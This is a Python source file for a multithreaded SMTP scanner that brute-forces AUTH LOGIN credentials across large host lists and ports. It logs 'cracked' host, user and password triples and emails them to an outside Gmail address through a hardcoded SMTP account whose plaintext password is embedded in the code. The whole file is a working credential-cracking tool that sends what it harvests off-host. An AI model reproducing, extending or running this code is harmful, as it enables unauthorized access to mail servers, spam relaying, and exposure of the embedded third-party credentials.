import socket
import sys
import base64
import threading
import queue
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import logging
from datetime import datetime, timedelta
import json
import os
import traceback
import argparse
import signal
import ssl
import re
import gzip
from typing import Iterator

# --- SMTP CONFIGURATION (EDIT THESE or set environment variables) ---
SMTP_SERVER = os.getenv('SMTP_SERVER', "mail.globalhouse.co.th")
SMTP_PORT = int(os.getenv('SMTP_PORT', "587"))  # SMTP notification port
SMTP_USER = os.getenv('SMTP_USER', "tp@globalhouse.co.th")
SMTP_PASS = os.getenv('SMTP_PASS', "Globalhouse@123")
NOTIFY_EMAIL = os.getenv('NOTIFY_EMAIL', "Selfless046@gmail.com")
# ---------------------------------------

# --- NOTIFICATION SETTINGS ---
MIN_NOTIFICATION_INTERVAL = 300  # 5 mins between notifications per host
MAX_NOTIFICATIONS_PER_HOUR = 10**9  # effectively unlimited notifications
ONLY_NOTIFY_WORKING_VALID_SMTP = True
THROTTLE_DELAY_SECONDS = 0.0  # default no artificial delay; overridable via CLI
# ---------------------------------------

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('smtp_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

notification_tracker = {
    'last_notification_time': {},
    'hourly_count': 0,
    'hour_start': datetime.now()
}

notification_file = 'notification_history.json'

# Globals populated from CLI
PORT_LIST = [25, 587, 465, 2525]
CONNECT_TIMEOUT_SECONDS = 10
QUEUE_MAXSIZE = 100000
PROVIDER_DETECTION_MODE = 'fast'  # off|fast|full
IPS_PATH = 'ips.txt'


def load_notification_history():
    global notification_tracker
    if os.path.exists(notification_file):
        try:
            with open(notification_file, 'r') as f:
                data = json.load(f)
                data['last_notification_time'] = {
                    host: datetime.fromisoformat(t)
                    for host, t in data.get('last_notification_time', {}).items()
                }
                data['hour_start'] = datetime.fromisoformat(data['hour_start'])
                notification_tracker.update(data)
        except Exception as e:
            logger.warning(f"Could not load notification history: {e}")


def save_notification_history():
    try:
        data = notification_tracker.copy()
        data['last_notification_time'] = {
            host: dt.isoformat() for host, dt in data['last_notification_time'].items()
        }
        data['hour_start'] = data['hour_start'].isoformat()
        with open(notification_file, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Could not save notification history: {e}")


def signal_handler(sig, frame):
    logger.info('Received exit signal, shutting down gracefully...')
    save_notification_history()
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

parser = argparse.ArgumentParser(description='SMTP Scanner')
parser.add_argument('threads', type=int, help='Number of threads')
parser.add_argument('verbose', choices=['good', 'bad'], help='Verbosity level')
parser.add_argument('debug', choices=['d1', 'd2', 'd3', 'd4'], help='Debug level')
parser.add_argument('--ips', default='ips.txt', help="Path to IP/host list file; use '-' for stdin; supports .gz")
parser.add_argument('--ports', default='25,587,465,2525', help='Comma-separated list of ports to scan')
parser.add_argument('--timeout', type=int, default=10, help='Socket connect timeout in seconds')
parser.add_argument('--queue-size', type=int, default=100000, help='Max queue size for hosts')
parser.add_argument('--provider-detection', choices=['off', 'fast', 'full'], default='fast', help='Provider detection mode')
parser.add_argument('--throttle', type=float, default=0.0, help='Delay between attempts per thread in seconds')
args = parser.parse_args()

ThreadNumber = args.threads
Verbose = args.verbose
Dbg = args.debug

# Thread-safe cracked list and write lock
cracked_lock = threading.Lock()
write_lock = threading.Lock()
notification_lock = threading.Lock()
cracked = set()

# Apply CLI globals
try:
    PORT_LIST = [int(p.strip()) for p in args.ports.split(',') if p.strip()]
    if not any(p in (25, 587) for p in PORT_LIST):
        PORT_LIST = sorted(set(PORT_LIST + [25, 587]))
except Exception:
    PORT_LIST = [25, 587, 465, 2525]
CONNECT_TIMEOUT_SECONDS = max(1, int(args.timeout))
QUEUE_MAXSIZE = max(1000, int(args.queue_size))
PROVIDER_DETECTION_MODE = args.provider_detection
THROTTLE_DELAY_SECONDS = max(0.0, float(args.throttle))
IPS_PATH = args.ips


def load_lines(filename):
    lines = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    lines.append(line)
    except FileNotFoundError:
        logger.warning(f"File not found: {filename}")
    return lines


def stream_hosts(path: str) -> Iterator[str]:
    """Yield hosts line-by-line without loading entire file into memory.
    Supports '-' for stdin and .gz files.
    """
    if path == '-':
        for line in sys.stdin:
            line = line.strip()
            if line and not line.startswith('#'):
                yield line
        return

    opener = gzip.open if path.endswith('.gz') else open
    mode = 'rt'
    try:
        with opener(path, mode, encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    yield line
    except FileNotFoundError:
        logger.warning(f"File not found: {path}")
        return


def can_send_notification(host):
    now = datetime.now()

    if now - notification_tracker['hour_start'] > timedelta(hours=1):
        notification_tracker['hourly_count'] = 0
        notification_tracker['hour_start'] = now

    if host in notification_tracker['last_notification_time']:
        elapsed = (now - notification_tracker['last_notification_time'][host]).total_seconds()
        if elapsed < MIN_NOTIFICATION_INTERVAL:
            logger.debug(f"Skipping notification for {host}: only {elapsed:.1f}s since last notification")
            return False

    return True


def send_email_notification(subject, body, host, port):
    with notification_lock:
        if not can_send_notification(host):
            logger.debug(f"Notification skipped by rate limit for host {host}")
            return False
        try:
            msg = MIMEMultipart()
            msg['Subject'] = f"[WORKING VALID SMTP] {subject}"
            msg['From'] = SMTP_USER
            msg['To'] = NOTIFY_EMAIL

            enhanced_body = f"""WORKING VALID SMTP Server Alert
===================================

{body}

Port: {port}

Scanner Details:
- Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- Scanner Host: {socket.gethostname()}
- Thread Count: {ThreadNumber}
- Status: WORKING VALID (Live + Authenticated)

This server is ready for email delivery operations.
This is an automated notification from your SMTP scanner.
"""
            msg.attach(MIMEText(enhanced_body, 'plain'))

            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=20)
            server.starttls()
            server.login(SMTP_USER, SMTP_PASS)
            server.sendmail(SMTP_USER, [NOTIFY_EMAIL], msg.as_string())
            server.quit()

            notification_tracker['last_notification_time'][host] = datetime.now()
            notification_tracker['hourly_count'] += 1
            save_notification_history()

            logger.info(f"Notification sent for {host}: {subject}")
            return True
        except Exception as e:
            logger.error(f"Failed to send notification for {host}: {e}\n{traceback.format_exc()}")
            return False


def GetDomainFromBanner(banner):
    try:
        if banner.startswith("220 "):
            TempBanner = banner.split(" ")[1]
        elif banner.startswith("220-"):
            TempBanner = banner.split(" ")[0].split("220-")[1]
        else:
            TempBanner = banner
        FirstDomain = TempBanner.rstrip()
        subs = ['.com', '.org', '.net', '.edu', '.gov']
        for sd in subs:
            if FirstDomain.endswith(sd):
                parts = FirstDomain.split(".")
                if len(parts) >= 3:
                    return ".".join(parts[-3:])
                return FirstDomain
        parts = FirstDomain.split(".")
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return FirstDomain
    except Exception as e:
        logger.error(f"Error parsing banner: {e}")
        return "unknown.domain"


# --- Provider detection helpers ---

def _safe_lower(s: str) -> str:
    try:
        return s.lower()
    except Exception:
        return ""


def _extract_cert_dns_names(cert: dict) -> list:
    names = []
    try:
        for tup in cert.get('subject', []):
            for key, val in tup:
                if key == 'commonName' and isinstance(val, str):
                    names.append(val.lower())
        for typ, name in cert.get('subjectAltName', []):
            if typ.lower() == 'dns' and isinstance(name, str):
                names.append(name.lower())
    except Exception:
        pass
    return list(dict.fromkeys(names))


def detect_smtp_provider(host: str, port: int, mode: str, timeout: int) -> tuple:
    """Return (provider, evidence) based on banner/EHLO and optionally rDNS/TLS cert.
    mode: off|fast|full
    """
    if mode == 'off':
        return 'Unknown', ''

    banner = ""
    ehlo = ""
    provider = "Unknown"
    evidence = []

    # Fast path: single TCP session to get banner + EHLO; no TLS negotiation
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            try:
                banner = sock.recv(2048).decode(errors='ignore')
            except Exception:
                banner = ""
            try:
                sock.sendall(b'EHLO provider-check\r\n')
                ehlo = sock.recv(4096).decode(errors='ignore')
            except Exception:
                ehlo = ""
            try:
                sock.sendall(b'QUIT\r\n')
            except Exception:
                pass
    except Exception:
        pass

    banner_lc = _safe_lower(banner)
    ehlo_lc = _safe_lower(ehlo)

    # Optional heavy checks only in full mode
    rdns_lc = ""
    cert_names = []
    if mode == 'full':
        try:
            ip = host
            if not re.match(r'^\d{1,3}(?:\.\d{1,3}){3}$', host):
                ip = socket.gethostbyname(host)
            name, _, _ = socket.gethostbyaddr(ip)
            rdns_lc = name.lower()
        except Exception:
            rdns_lc = ""
        try:
            context = ssl.create_default_context()
            with smtplib.SMTP(host, port, timeout=timeout) as server:
                server.ehlo_or_helo_if_needed()
                if server.has_extn('starttls'):
                    server.starttls(context=context)
                    server.ehlo()
                    cert = server.sock.getpeercert()
                    cert_names = _extract_cert_dns_names(cert)
        except Exception:
            cert_names = []

    # Mailgun heuristics
    if (
        'mailgun' in banner_lc or 'mailgun' in ehlo_lc or
        ('mailgun' in rdns_lc if rdns_lc else False) or any('mailgun' in n for n in cert_names) or
        'smtp.mailgun.org' in banner_lc or 'smtp.mailgun.org' in ehlo_lc
    ):
        provider = 'Mailgun'
        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])

    # SendGrid heuristics
    elif (
        'sendgrid' in banner_lc or 'sendgrid' in ehlo_lc or
        ('sendgrid' in rdns_lc if rdns_lc else False) or any('sendgrid' in n for n in cert_names) or
        'smtpsendgrid.net' in banner_lc or 'smtpsendgrid.net' in ehlo_lc
    ):
        provider = 'SendGrid'
        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])

    # Amazon SES heuristics
    elif (
        'amazon ses' in banner_lc or 'amazon ses' in ehlo_lc or
        'amazonses' in banner_lc or 'amazonses' in ehlo_lc or
        'amazonaws.com' in banner_lc or 'amazonaws.com' in ehlo_lc or
        ('amazonaws.com' in rdns_lc if rdns_lc else False) or any('amazonaws.com' in n or 'amazonses' in n for n in cert_names) or
        ('email-smtp' in banner_lc and 'amazonaws.com' in banner_lc) or
        ('email-smtp' in ehlo_lc and 'amazonaws.com' in ehlo_lc)
    ):
        provider = 'Amazon SES'
        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])

    # Xserver (JP) heuristics
    elif (
        'xserver.ne.jp' in banner_lc or 'xserver.ne.jp' in ehlo_lc or
        'xserver.jp' in banner_lc or 'xserver.jp' in ehlo_lc or
        ('xserver.ne.jp' in rdns_lc if rdns_lc else False) or
        any('xserver.ne.jp' in n or 'xserver.jp' in n for n in cert_names)
    ):
        provider = 'Xserver (JP)'
        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])

    # Sakura Internet (JP) heuristics
    elif (
        'sakura.net.jp' in banner_lc or 'sakura.net.jp' in ehlo_lc or
        'sakura.ne.jp' in banner_lc or 'sakura.ne.jp' in ehlo_lc or
        'sakura.ad.jp' in banner_lc or 'sakura.ad.jp' in ehlo_lc or
        'sakurainternet' in banner_lc or 'sakurainternet' in ehlo_lc or
        ('sakura.net.jp' in rdns_lc if rdns_lc else False) or
        ('sakura.ne.jp' in rdns_lc if rdns_lc else False) or
        ('sakura.ad.jp' in rdns_lc if rdns_lc else False) or
        any(('sakura.net.jp' in n) or ('sakura.ne.jp' in n) or ('sakura.ad.jp' in n) or ('sakurainternet' in n) for n in cert_names)
    ):
        provider = 'Sakura (JP)'
        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])

    # BIGLOBE (JP) heuristics
    elif (
        'biglobe.jp' in banner_lc or 'biglobe.jp' in ehlo_lc or
        'biglobe.ne.jp' in banner_lc or 'biglobe.ne.jp' in ehlo_lc or
        ('biglobe.jp' in rdns_lc if rdns_lc else False) or
        ('biglobe.ne.jp' in rdns_lc if rdns_lc else False) or
        any('biglobe.jp' in n or 'biglobe.ne.jp' in n for n in cert_names)
    ):
        provider = 'BIGLOBE (JP)'
        evidence.extend([p for p in [banner.strip(), ehlo.strip(), rdns_lc] if p])

    evidence_str = "; ".join([e[:300] for e in evidence if e])
    return provider, evidence_str


def validate_smtp_server(host, port=25, timeout=None):
    if timeout is None:
        timeout = CONNECT_TIMEOUT_SECONDS
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            banner = sock.recv(1024).decode(errors='ignore')
            if not banner.startswith('220'):
                return False, f"Invalid banner: {banner.strip()}"
            sock.sendall(b'EHLO scanner-test\r\n')
            ehlo_resp = sock.recv(2048).decode(errors='ignore')
            sock.sendall(b'QUIT\r\n')
            try:
                sock.recv(256)
            except Exception:
                pass
            if '250' in ehlo_resp:
                return True, f"Banner: {banner.strip()}, EHLO: OK"
            else:
                return False, f"EHLO failed: {ehlo_resp.strip()}"
    except Exception as e:
        return False, f"Exception: {e}"


def test_email_delivery(host, port, user, password):
    try:
        with smtplib.SMTP(host, port, timeout=CONNECT_TIMEOUT_SECONDS) as server:
            server.starttls()
            server.login(user, password)
            server.mail(user)
            try:
                server.rcpt("test@example.com")
                return True
            except smtplib.SMTPRecipientsRefused:
                return True
            except Exception:
                return False
    except Exception as e:
        logger.debug(f"Email delivery test failed at {host}:{port}: {e}")
        return False


# Loaded globally for worker access
USERS_LIST: list[str] = []
PASSWORDS_LIST: list[str] = []


class SMTPScanner(threading.Thread):
    def __init__(self, queue, bad_file, val_file, live_file, working_file):
        super().__init__()
        self.queue = queue
        self.bad = bad_file
        self.val = val_file
        self.live = live_file
        self.working = working_file

    def run(self):
        while True:
            host = self.queue.get()
            try:
                self.scan_host(host)
            except Exception as e:
                logger.error(f"Thread error scanning {host}: {e}\n{traceback.format_exc()}")
            self.queue.task_done()

    def scan_host(self, host):
        # Iterate ports once per host
        for port in PORT_LIST:
            with cracked_lock:
                if f"{host}:{port}" in cracked:
                    continue

            is_valid, val_info = validate_smtp_server(host, port, timeout=CONNECT_TIMEOUT_SECONDS)
            if not is_valid:
                if Verbose == 'bad':
                    with write_lock:
                        self.bad.write(f"{host}:{port} - {val_info}\n")
                if THROTTLE_DELAY_SECONDS > 0:
                    time.sleep(THROTTLE_DELAY_SECONDS)
                continue

            # Provider detection (configurable)
            provider, evidence = detect_smtp_provider(host, port, PROVIDER_DETECTION_MODE, CONNECT_TIMEOUT_SECONDS)
            provider_info = f"Provider: {provider}" + (f" | Evidence: {evidence}" if evidence else "")

            with write_lock:
                self.live.write(f"{host}:{port} - {val_info} - {provider_info}\n")

            if Dbg in ['d1', 'd3', 'd4']:
                print(f"[LIVE] {host}:{port} - {val_info} - {provider_info}")

            # If no auth lists, skip auth attempts
            if not USERS_LIST or not PASSWORDS_LIST:
                continue

            # Try all credentials for this host:port
            for user in USERS_LIST:
                # Join passwords into one string for in-session attempts
                passwd_joined = "|".join(PASSWORDS_LIST)
                try:
                    auth_res, auth_details = self.test_authentication(host, port, user, passwd_joined, val_info)
                except Exception as e:
                    logger.error(f"Authentication exception {host}:{port} - {e}\n{traceback.format_exc()}")
                    break

                if auth_res:
                    with cracked_lock:
                        cracked.add(f"{host}:{port}")

                    working_status = "WORKING VALID (Live + Authenticated)"
                    entry = f"{host}:{port} {auth_details['user']} {auth_details['password']} - {val_info} - {working_status} - {provider_info}\n"
                    with write_lock:
                        self.working.write(entry)
                        self.val.write(f"{host}:{port} {auth_details['user']} {auth_details['password']} - {provider_info}\n")

                    if ONLY_NOTIFY_WORKING_VALID_SMTP:
                        subject = f"WORKING VALID SMTP Found: {host}:{port} ({provider})"
                        body = f"""Host: {host}
Port: {port}
User: {auth_details['user']}
Password: {auth_details['password']}
Validation: {val_info}
Provider: {provider}
Evidence: {evidence}
Status: {working_status}

This SMTP server is ready for email delivery operations."""
                        send_email_notification(subject, body, host, port)

                    logger.info(f"WORKING VALID SMTP found: {host}:{port} ({provider})")
                    # Stop trying other users for this host:port once valid
                    break

            if THROTTLE_DELAY_SECONDS > 0:
                time.sleep(THROTTLE_DELAY_SECONDS)

    def test_authentication(self, host, port, user, passwd, validation_info, max_retries=2):
        attempt = 0
        while attempt < max_retries:
            try:
                with socket.create_connection((host, port), timeout=CONNECT_TIMEOUT_SECONDS) as sock:
                    try:
                        banner = sock.recv(1024).decode(errors='ignore')
                    except (ConnectionResetError, ConnectionAbortedError) as e:
                        logger.debug(f"Conn reset while receiving banner from {host}:{port} - {e}")
                        return False, {}

                    if not banner.startswith('220'):
                        return False, {}

                    sock.sendall(b'EHLO scanner\r\n')

                    try:
                        data = sock.recv(2048).decode(errors='ignore')
                    except (ConnectionResetError, ConnectionAbortedError) as e:
                        logger.debug(f"Conn reset during EHLO from {host}:{port} - {e}")
                        return False, {}

                    if '250' not in data:
                        try:
                            sock.sendall(b'QUIT\r\n')
                        except Exception:
                            pass
                        return False, {}

                    domain = GetDomainFromBanner(banner)
                    # If user already has a domain part, use as-is
                    userd = user if ('@' in user) else f"{user}@{domain}"

                    for pwd in passwd.split("|"):
                        pwd2 = pwd.replace("%user%", user).replace("%User%", user.title())

                        sock.sendall(b'RSET\r\n')
                        try:
                            sock.recv(256)
                        except (ConnectionResetError, ConnectionAbortedError) as e:
                            logger.debug(f"Conn reset after RSET at {host}:{port} - {e}")
                            return False, {}

                        sock.sendall(b'AUTH LOGIN\r\n')

                        try:
                            auth_prompt = sock.recv(256).decode(errors='ignore')
                        except (ConnectionResetError, ConnectionAbortedError) as e:
                            logger.debug(f"Conn reset during auth prompt on {host}:{port} - {e}")
                            return False, {}

                        if not auth_prompt.startswith('334'):
                            continue

                        if Dbg in ['d1', 'd3']:
                            print(f"[AUTH] Trying {host}:{port} {userd} {pwd2}")

                        sock.sendall(base64.b64encode(userd.rstrip().encode()) + b'\r\n')
                        try:
                            sock.recv(256)
                        except (ConnectionResetError, ConnectionAbortedError) as e:
                            logger.debug(f"Conn reset after sending user at {host}:{port} - {e}")
                            return False, {}

                        sock.sendall(base64.b64encode(pwd2.encode()) + b'\r\n')
                        try:
                            response = sock.recv(256).decode(errors='ignore')
                        except (ConnectionResetError, ConnectionAbortedError) as e:
                            logger.debug(f"Conn reset after sending password at {host}:{port} - {e}")
                            return False, {}

                        if response.startswith('235'):
                            logger.info(f"Valid credentials: {host}:{port} {userd} {pwd2}")
                            try:
                                sock.sendall(b'QUIT\r\n')
                            except Exception:
                                pass
                            return True, {'user': userd, 'password': pwd2, 'banner': banner.strip(), 'validation': validation_info}

                    try:
                        sock.sendall(b'QUIT\r\n')
                    except Exception:
                        pass
                    return False, {}

            except (ConnectionResetError, ConnectionAbortedError, socket.timeout, socket.error) as e:
                logger.debug(f"Connection error on {host}:{port} attempt {attempt+1}/{max_retries} - {e}")
                attempt += 1
                time.sleep(0.5)
                continue
            except Exception as e:
                logger.error(f"Auth test failed {host}:{port}: {e}\n{traceback.format_exc()}")
                return False, {}

        return False, {}


def main(thread_number):
    logger.info(f"Starting SMTP scanner with {thread_number} threads")
    logger.info("Notification mode: WORKING VALID SMTPs only (Live + Authenticated)")

    q = queue.Queue(maxsize=QUEUE_MAXSIZE)

    with open('bad.txt', 'w', encoding='utf-8') as bad_file, \
         open('valid.txt', 'a', encoding='utf-8') as val_file, \
         open('live_smtp_servers.txt', 'a', encoding='utf-8') as live_file, \
         open('working_valid_smtp_servers.txt', 'a', encoding='utf-8') as working_file:

        for _ in range(thread_number):
            thread = SMTPScanner(q, bad_file, val_file, live_file, working_file)
            thread.daemon = True
            thread.start()

        logger.info(f"Streaming hosts from {IPS_PATH}; ports={PORT_LIST}; users={len(USERS_LIST)}; passwords={len(PASSWORDS_LIST)}; provider_detection={PROVIDER_DETECTION_MODE}; timeout={CONNECT_TIMEOUT_SECONDS}s")

        enq = 0
        start_time = time.time()
        for host in stream_hosts(IPS_PATH):
            q.put(host)
            enq += 1
            if enq % 10000 == 0:
                rate = enq / max(0.001, (time.time() - start_time))
                logger.info(f"Enqueued {enq} hosts (rate ~{rate:.0f}/s)")

        q.join()
        logger.info("Scanning completed")

        # Summary notification
        try:
            with open('working_valid_smtp_servers.txt', 'r') as f:
                count = sum(1 for _ in f)
            if count > 0:
                subject = f"SMTP Scan Complete - {count} WORKING VALID SMTP Servers Found"
                body = f"""Scan Summary:
- Total WORKING VALID SMTP servers: {count}
- Thread count used: {thread_number}
- Ports: {PORT_LIST}
- Provider detection: {PROVIDER_DETECTION_MODE}
- Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

WORKING VALID = Live + Authenticated

Check working_valid_smtp_servers.txt for full details."""
                send_email_notification(subject, body, "summary", "-")
            else:
                logger.info("No working valid SMTP servers found")
        except Exception as e:
            logger.error(f"Could not send summary notification: {e}\n{traceback.format_exc()}")


if __name__ == "__main__":
    load_notification_history()

    try:
        cracked_list = []
        alreadycracked = load_lines('valid.txt')
        cracked_list = [line.split(" ")[0].split(":")[0] for line in alreadycracked if ' ' in line]
        with cracked_lock:
            cracked.update(cracked_list)
    except Exception:
        logger.info("No existing valid.txt or error reading")

    USERS_LIST = load_lines('users.txt')
    PASSWORDS_LIST = load_lines('pass.txt')

    if not USERS_LIST:
        logger.warning("No users loaded; using empty user for live detection")
        USERS_LIST = []
    if not PASSWORDS_LIST:
        logger.warning("No passwords loaded; using empty password for live detection")
        PASSWORDS_LIST = []

    logger.info(f"Loaded {len(USERS_LIST)} users and {len(PASSWORDS_LIST)} passwords")

    try:
        main(ThreadNumber)
    except Exception as e:
        logger.error(f"Unexpected error in main: {e}\n{traceback.format_exc()}")
    finally:
        save_notification_history()